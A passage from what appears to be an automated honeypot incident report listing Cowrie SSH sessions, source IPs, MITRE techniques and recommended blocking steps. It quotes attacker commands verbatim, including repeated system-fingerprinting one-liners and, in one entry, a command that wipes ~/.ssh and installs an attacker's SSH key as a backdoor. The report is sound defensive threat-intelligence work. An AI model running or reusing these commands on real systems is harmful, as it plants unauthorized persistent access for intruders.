| `2026-07-17 06:12:14` | `cowrie.log.closed` |
| `2026-07-17 06:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44916551c1ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:13 |
| **Last Seen** | 2026-07-17 06:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:13:54` | `cowrie.session.connect` |
| `2026-07-17 06:13:54` | `cowrie.client.version` |
| `2026-07-17 06:13:55` | `cowrie.client.kex` |
| `2026-07-17 06:13:56` | `cowrie.login.success` |
| `2026-07-17 06:13:57` | `cowrie.session.params` |
| `2026-07-17 06:13:57` | `cowrie.command.input` |
| `2026-07-17 06:13:57` | `cowrie.command.input` |
| `2026-07-17 06:13:57` | `cowrie.command.input` |
| `2026-07-17 06:13:57` | `cowrie.command.input` |
| `2026-07-17 06:13:57` | `cowrie.command.input` |
| `2026-07-17 06:13:57` | `cowrie.command.success` |
| `2026-07-17 06:13:57` | `cowrie.command.input` |
| `2026-07-17 06:13:57` | `cowrie.command.input` |
| `2026-07-17 06:13:57` | `cowrie.command.input` |
| `2026-07-17 06:13:57` | `cowrie.command.input` |
| `2026-07-17 06:13:57` | `cowrie.log.closed` |
| `2026-07-17 06:13:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39164ee2a9b0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:15 |
| **Last Seen** | 2026-07-17 06:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:15:31` | `cowrie.session.connect` |
| `2026-07-17 06:15:31` | `cowrie.client.version` |
| `2026-07-17 06:15:32` | `cowrie.client.kex` |
| `2026-07-17 06:15:33` | `cowrie.login.success` |
| `2026-07-17 06:15:34` | `cowrie.session.params` |
| `2026-07-17 06:15:34` | `cowrie.command.input` |
| `2026-07-17 06:15:35` | `cowrie.command.input` |
| `2026-07-17 06:15:35` | `cowrie.command.input` |
| `2026-07-17 06:15:35` | `cowrie.command.input` |
| `2026-07-17 06:15:35` | `cowrie.command.input` |
| `2026-07-17 06:15:35` | `cowrie.command.success` |
| `2026-07-17 06:15:35` | `cowrie.command.input` |
| `2026-07-17 06:15:35` | `cowrie.command.input` |
| `2026-07-17 06:15:35` | `cowrie.command.input` |
| `2026-07-17 06:15:35` | `cowrie.command.input` |
| `2026-07-17 06:15:35` | `cowrie.log.closed` |
| `2026-07-17 06:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fc7a6332f9b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:17 |
| **Last Seen** | 2026-07-17 06:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:17:00` | `cowrie.session.connect` |
| `2026-07-17 06:17:00` | `cowrie.client.version` |
| `2026-07-17 06:17:00` | `cowrie.client.kex` |
| `2026-07-17 06:17:02` | `cowrie.login.success` |
| `2026-07-17 06:17:03` | `cowrie.session.params` |
| `2026-07-17 06:17:03` | `cowrie.command.input` |
| `2026-07-17 06:17:03` | `cowrie.command.input` |
| `2026-07-17 06:17:03` | `cowrie.command.input` |
| `2026-07-17 06:17:03` | `cowrie.command.input` |
| `2026-07-17 06:17:03` | `cowrie.command.input` |
| `2026-07-17 06:17:03` | `cowrie.command.success` |
| `2026-07-17 06:17:03` | `cowrie.command.input` |
| `2026-07-17 06:17:03` | `cowrie.command.input` |
| `2026-07-17 06:17:03` | `cowrie.command.input` |
| `2026-07-17 06:17:03` | `cowrie.command.input` |
| `2026-07-17 06:17:04` | `cowrie.log.closed` |
| `2026-07-17 06:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8866206069a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.228[.]201` |
| **First Seen** | 2026-07-17 06:17 |
| **Last Seen** | 2026-07-17 06:23 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:17:56` | `cowrie.session.connect` |
| `2026-07-17 06:17:56` | `cowrie.client.version` |
| `2026-07-17 06:17:58` | `cowrie.client.kex` |
| `2026-07-17 06:18:00` | `cowrie.login.success` |
| `2026-07-17 06:23:00` | `cowrie.session.file_upload` |
| `2026-07-17 06:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.228[.]201` to AbuseIPDB if not already reported
- [ ] Block `101.36.228[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1d25ccea6d9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:18 |
| **Last Seen** | 2026-07-17 06:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:18:29` | `cowrie.session.connect` |
| `2026-07-17 06:18:30` | `cowrie.client.version` |
| `2026-07-17 06:18:30` | `cowrie.client.kex` |
| `2026-07-17 06:18:31` | `cowrie.login.success` |
| `2026-07-17 06:18:32` | `cowrie.session.params` |
| `2026-07-17 06:18:32` | `cowrie.command.input` |
| `2026-07-17 06:18:32` | `cowrie.command.input` |
| `2026-07-17 06:18:32` | `cowrie.command.input` |
| `2026-07-17 06:18:32` | `cowrie.command.input` |
| `2026-07-17 06:18:32` | `cowrie.command.input` |
| `2026-07-17 06:18:32` | `cowrie.command.success` |
| `2026-07-17 06:18:32` | `cowrie.command.input` |
| `2026-07-17 06:18:32` | `cowrie.command.input` |
| `2026-07-17 06:18:32` | `cowrie.command.input` |
| `2026-07-17 06:18:32` | `cowrie.command.input` |
| `2026-07-17 06:18:33` | `cowrie.log.closed` |
| `2026-07-17 06:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3da7d7d4ce32

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-07-17 06:19 |
| **Last Seen** | 2026-07-17 06:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:19:37` | `cowrie.session.connect` |
| `2026-07-17 06:19:37` | `cowrie.client.version` |
| `2026-07-17 06:19:37` | `cowrie.client.kex` |
| `2026-07-17 06:19:39` | `cowrie.login.success` |
| `2026-07-17 06:19:40` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ebabf60f82

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-07-17 06:19 |
| **Last Seen** | 2026-07-17 06:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:19:45` | `cowrie.session.connect` |
| `2026-07-17 06:19:46` | `cowrie.client.version` |
| `2026-07-17 06:19:46` | `cowrie.client.kex` |
| `2026-07-17 06:19:48` | `cowrie.login.success` |
| `2026-07-17 06:19:49` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443978bf545d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 06:19 |
| **Last Seen** | 2026-07-17 06:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:19:59` | `cowrie.session.connect` |
| `2026-07-17 06:19:59` | `cowrie.client.version` |
| `2026-07-17 06:19:59` | `cowrie.client.kex` |
| `2026-07-17 06:20:01` | `cowrie.login.success` |
| `2026-07-17 06:20:02` | `cowrie.session.params` |
| `2026-07-17 06:20:02` | `cowrie.command.input` |
| `2026-07-17 06:20:02` | `cowrie.command.input` |
| `2026-07-17 06:20:02` | `cowrie.command.input` |
| `2026-07-17 06:20:02` | `cowrie.command.input` |
| `2026-07-17 06:20:02` | `cowrie.command.input` |
| `2026-07-17 06:20:02` | `cowrie.command.success` |
| `2026-07-17 06:20:02` | `cowrie.command.input` |
| `2026-07-17 06:20:02` | `cowrie.command.input` |
| `2026-07-17 06:20:02` | `cowrie.command.input` |
| `2026-07-17 06:20:02` | `cowrie.command.input` |
| `2026-07-17 06:20:02` | `cowrie.log.closed` |
| `2026-07-17 06:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a185f0807a

| Field | Detail |
|---|---|
| **Source IP** | `117.2.123[.]19` |
| **First Seen** | 2026-07-17 06:22 |
| **Last Seen** | 2026-07-17 06:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:22:51` | `cowrie.session.connect` |
| `2026-07-17 06:22:52` | `cowrie.client.version` |
| `2026-07-17 06:22:52` | `cowrie.client.kex` |
| `2026-07-17 06:22:54` | `cowrie.login.success` |
| `2026-07-17 06:22:54` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.2.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `117.2.123[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89030ccf38f6

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-07-17 06:34 |
| **Last Seen** | 2026-07-17 06:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:34:06` | `cowrie.session.connect` |
| `2026-07-17 06:34:06` | `cowrie.client.version` |
| `2026-07-17 06:34:06` | `cowrie.client.kex` |
| `2026-07-17 06:34:07` | `cowrie.login.success` |
| `2026-07-17 06:34:08` | `cowrie.session.params` |
| `2026-07-17 06:34:08` | `cowrie.command.input` |
| `2026-07-17 06:34:08` | `cowrie.command.failed` |
| `2026-07-17 06:34:09` | `cowrie.log.closed` |
| `2026-07-17 06:34:09` | `cowrie.session.params` |
| `2026-07-17 06:34:09` | `cowrie.command.input` |
| `2026-07-17 06:34:10` | `cowrie.session.file_download` |
| `2026-07-17 06:34:10` | `cowrie.log.closed` |
| `2026-07-17 06:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2fdc28325f3

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-07-17 06:34 |
| **Last Seen** | 2026-07-17 06:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:34:10` | `cowrie.session.connect` |
| `2026-07-17 06:34:10` | `cowrie.client.version` |
| `2026-07-17 06:34:10` | `cowrie.client.kex` |
| `2026-07-17 06:34:11` | `cowrie.login.success` |
| `2026-07-17 06:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59ad2a50c033

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-07-17 06:34 |
| **Last Seen** | 2026-07-17 06:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:34:11` | `cowrie.session.connect` |
| `2026-07-17 06:34:11` | `cowrie.client.version` |
| `2026-07-17 06:34:12` | `cowrie.client.kex` |
| `2026-07-17 06:34:12` | `cowrie.login.success` |
| `2026-07-17 06:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70624ac7ca5c

| Field | Detail |
|---|---|
| **Source IP** | `65.20.250[.]180` |
| **First Seen** | 2026-07-17 06:37 |
| **Last Seen** | 2026-07-17 06:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:37:04` | `cowrie.session.connect` |
| `2026-07-17 06:37:05` | `cowrie.client.version` |
| `2026-07-17 06:37:05` | `cowrie.client.kex` |
| `2026-07-17 06:37:06` | `cowrie.login.success` |
| `2026-07-17 06:37:06` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.250[.]180` to AbuseIPDB if not already reported
- [ ] Block `65.20.250[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02abbdbbd26c

| Field | Detail |
|---|---|
| **Source IP** | `220.180.171[.]157` |
| **First Seen** | 2026-07-17 06:37 |
| **Last Seen** | 2026-07-17 06:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:37:14` | `cowrie.session.connect` |
| `2026-07-17 06:37:15` | `cowrie.client.version` |
| `2026-07-17 06:37:15` | `cowrie.client.kex` |
| `2026-07-17 06:37:18` | `cowrie.login.success` |
| `2026-07-17 06:37:19` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.171[.]157` to AbuseIPDB if not already reported
- [ ] Block `220.180.171[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e59b1f0c5ef

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 06:40 |
| **Last Seen** | 2026-07-17 06:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:40:53` | `cowrie.session.connect` |
| `2026-07-17 06:40:53` | `cowrie.client.version` |
| `2026-07-17 06:40:53` | `cowrie.client.kex` |
| `2026-07-17 06:40:54` | `cowrie.login.success` |
| `2026-07-17 06:40:54` | `cowrie.session.params` |
| `2026-07-17 06:40:54` | `cowrie.command.input` |
| `2026-07-17 06:40:54` | `cowrie.log.closed` |
| `2026-07-17 06:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1213d0ef0a9

| Field | Detail |
|---|---|
| **Source IP** | `90.230.168[.]26` |
| **First Seen** | 2026-07-17 06:44 |
| **Last Seen** | 2026-07-17 06:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:44:25` | `cowrie.session.connect` |
| `2026-07-17 06:44:26` | `cowrie.client.version` |
| `2026-07-17 06:44:26` | `cowrie.client.kex` |
| `2026-07-17 06:44:27` | `cowrie.login.success` |
| `2026-07-17 06:44:27` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.230.168[.]26` to AbuseIPDB if not already reported
- [ ] Block `90.230.168[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53859f3eb075

| Field | Detail |
|---|---|
| **Source IP** | `120.234.232[.]184` |
| **First Seen** | 2026-07-17 06:44 |
| **Last Seen** | 2026-07-17 06:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:44:32` | `cowrie.session.connect` |
| `2026-07-17 06:44:33` | `cowrie.client.version` |
| `2026-07-17 06:44:33` | `cowrie.client.kex` |
| `2026-07-17 06:44:35` | `cowrie.login.success` |
| `2026-07-17 06:44:36` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.232[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.234.232[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f5f15034bcb

| Field | Detail |
|---|---|
| **Source IP** | `50.188.204[.]213` |
| **First Seen** | 2026-07-17 06:47 |
| **Last Seen** | 2026-07-17 06:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:47:56` | `cowrie.session.connect` |
| `2026-07-17 06:47:57` | `cowrie.client.version` |
| `2026-07-17 06:47:57` | `cowrie.client.kex` |
| `2026-07-17 06:47:58` | `cowrie.login.success` |
| `2026-07-17 06:47:58` | `cowrie.direct-tcpip.request` |
| `2026-07-17 06:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.188.204[.]213` to AbuseIPDB if not already reported
- [ ] Block `50.188.204[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05dd85dbf91d

| Field | Detail |
|---|---|
| **Source IP** | `156.226.175[.]58` |
| **First Seen** | 2026-07-17 06:49 |
| **Last Seen** | 2026-07-17 06:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 06:49:06` | `cowrie.session.connect` |
| `2026-07-17 06:49:06` | `cowrie.login.success` |
| `2026-07-17 06:49:07` | `cowrie.session.params` |
| `2026-07-17 06:49:07` | `cowrie.command.input` |
| `2026-07-17 06:49:08` | `cowrie.command.input` |
| `2026-07-17 06:49:08` | `cowrie.command.input` |
| `2026-07-17 06:49:09` | `cowrie.command.input` |
| `2026-07-17 06:49:09` | `cowrie.command.failed` |
| `2026-07-17 06:49:10` | `cowrie.log.closed` |
| `2026-07-17 06:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.226.175[.]58` to AbuseIPDB if not already reported
- [ ] Block `156.226.175[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
